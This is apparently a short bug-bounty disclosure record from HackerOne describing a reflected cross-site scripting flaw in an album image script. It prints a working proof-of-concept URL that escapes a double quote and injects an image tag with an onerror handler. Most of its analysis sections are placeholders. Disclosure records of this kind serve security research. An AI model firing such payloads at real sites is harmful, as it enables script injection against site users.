# Album image XSS

## Metadata
- **Source:** HackerOne
- **Report:** 17235 | https://hackerone.com/reports/17235
- **Submitted:** 2014-06-22
- **Reporter:** bitquark
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
There's an XSS in the album script caused by insufficient escaping of double quotes.

PoC:

https://staging.uzbey.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain)%22%3E

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

There's an XSS in the album script caused by insufficient escaping of double quotes.

PoC:

https://staging.uzbey.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain)%22%3E

</details>

---
*Analysed by Claude on 2026-05-24*
